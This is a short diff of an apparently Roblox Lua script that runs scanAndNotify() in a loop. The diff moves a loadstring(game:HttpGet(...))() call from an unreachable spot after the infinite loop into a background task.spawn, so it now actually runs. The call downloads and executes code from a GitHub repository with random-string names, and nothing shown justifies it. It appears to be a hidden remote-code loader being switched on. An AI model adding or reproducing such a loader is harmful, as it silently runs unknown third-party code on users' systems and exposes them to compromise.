@@ -722,8 +722,11 @@ end
 
 scanAndNotify()
 
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/Vhposhpohosh0p.lua"))()
+end)
+
 while true do
     task.wait(2)
     scanAndNotify()
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/Vhposhpohosh0p.lua"))()
